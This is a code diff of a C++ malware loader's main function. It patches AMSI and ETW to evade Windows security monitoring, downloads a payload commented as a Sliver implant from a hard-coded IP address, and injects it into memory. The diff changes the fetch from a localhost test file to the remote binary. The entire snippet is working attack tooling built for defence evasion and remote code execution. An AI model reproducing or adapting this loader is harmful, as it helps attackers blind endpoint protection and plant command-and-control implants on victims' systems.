@@ -6,18 +6,17 @@
 int main() {
 	DefenderEmulator();
 
-
 	Bypass bypass;
 	Inject injector;
 	Download downloader;
-	std::string data = "";
+	std::vector<char> payload;
 
 	bypass.PatchAMSI();
 	bypass.PatchETW();
+	// Sliver bin.
+	payload = downloader.DownloadFile("http://192.168.152.134/INNOVATIVE_LEADER.bin");
 
-	data = downloader.download("127.0.0.1","/test.woff", 8080);
-
-	injector.injection(data);
+	injector.injection(payload);
 }
 
 
